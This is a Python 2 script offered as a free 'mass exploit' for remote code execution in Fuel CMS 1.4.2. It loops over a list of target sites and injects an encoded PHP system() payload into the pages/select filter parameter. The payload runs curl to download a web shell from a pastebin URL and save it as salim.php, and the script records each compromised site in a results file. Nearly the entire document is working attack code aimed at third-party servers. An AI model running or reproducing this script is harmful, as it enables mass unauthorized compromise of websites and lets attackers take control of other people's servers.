#/usr/bin!/
#Created By Salim Alk
#mass exploit rce fuel cms
#Free Script "_" 
#contact : http://facebook.com/SQmazine
#https://github.com/daylightstudio/FUEL-CMS/issues/478
#Imports Modules
import os
import sys
from multiprocessing import Pool
try:
	import requests
except ImportError:
	print(" Install Modules requests ")
try:
	import urllib
except ImportError:
	print(" Install Modules urllib ")
figlet = """
                       ###############################################
                       #                                             #
                       #                 salim alk                   #
                       #   Mass Exploit Rce Fuel Cms Version: 1.4.2  #
                       #                                             #
                       ###############################################

"""
#colors
w = '\033[37m'
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
if len(sys.argv) != 2:
	print figlet
	sys.exit("Usage: python %s sites.txt" % sys.argv[0])
#Vuln Point
grass = "/fuel/pages/select/?filter="
#Shell Dirc
shell="/salim.php"
phpinfo = "/fuel/pages/select/?nocache=1507880376191&input=&target=&title=&class=&pdfs=&filter=%27%2b phpinfo() %2b%27"
#Payload
p_1 = "%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"
p_2 = "%27%29%2b%27"
#bach may3tinach erro ta3 quote wdrt encode l payload
exec_code = (grass+p_1+urllib.quote("curl https://pastebin.com/raw/TDNCmJCP -o salim.php")+p_2)
#lista.txt
qlawi = sys.argv[1] 
def romansya():
	lista = open(qlawi, 'r')
	os.system("clear")
	print (b+figlet)
	for site in lista:
		for site in site.split():
			open_site = requests.get(site)
			if open_site.status_code==200:
				check = requests.get(site+grass)
				if check.status_code==200:
					explt = requests.get(site+exec_code)
					check_shell = requests.get(site+shell)
					if check_shell.status_code==200:
						print(w+site+shell+r+" 0wn3d ")
						f = open("rzlt.txt", 'a')
						f.write(site+shell)
					else:
						print(w+site+g+" Exploit Failed ")
						php = requests.get(site+phpinfo)
						if php.status_code==200:
							print(w+site+b+" phpinfo ")
							f = open("rzlt.txt", 'a')
							f.write(site+phpinfo)
						else:
							pass
				else:
					print(site+m+"Not Vuln")
			else:
				print(w+site+y+" ConnectionError ")
siteslist = open(qlawi, 'r').read().splitlines()
p = Pool(25)
p.map(romansya(), siteslist)
